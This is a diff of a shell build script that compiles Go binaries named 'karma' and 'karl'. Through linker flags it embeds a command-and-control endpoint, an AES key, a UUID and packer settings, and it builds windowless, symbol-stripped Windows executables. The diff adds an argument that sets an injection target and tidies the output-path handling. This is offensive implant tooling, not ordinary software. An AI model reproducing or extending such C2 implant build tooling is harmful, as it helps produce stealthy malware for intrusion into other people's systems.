@@ -11,6 +11,7 @@ X2=$7
 UUID=$8
 PACKER=$9
 OUTFILE=${10}
+INJECT=${11}
 
 LDFLAGS_KARMA=(
     "-X 'main.InitC2Endpoint=${C2}'"
@@ -31,6 +32,7 @@ LDFLAGS_KARL=(
     "-X 'main.aeskey=${AESKEY}'"
     "-X 'main.X1=${X1}'"
     "-X 'main.X2=${X2}'"
+    "-X 'main.Target=${INJECT}'"
     "-H=windowsgui"
     "-s"
     "-w"
@@ -59,8 +61,10 @@ if [ -z $OUTFILE ]; then
     OUTFILE=karl.exe
 fi
 
-if [ "$(dirname $LOCATION)" == "." ]; then
-    OUTFILE=$LOCATION
+if [ ! -z $LOCATION ]; then
+    if [ "$(dirname $LOCATION)" == "." ]; then
+        OUTFILE=$LOCATION
+    fi
 fi
 
 if [ "$OUTFILE" == "karl.exe" ] || [ "$OUTFILE" == "$LOCATION" ]; then
@@ -71,4 +75,4 @@ fi
 
 cd $OLDDIR
 
-echo "'karma' instance saved at $LOCATION"
+echo "saved to $LOCATION"
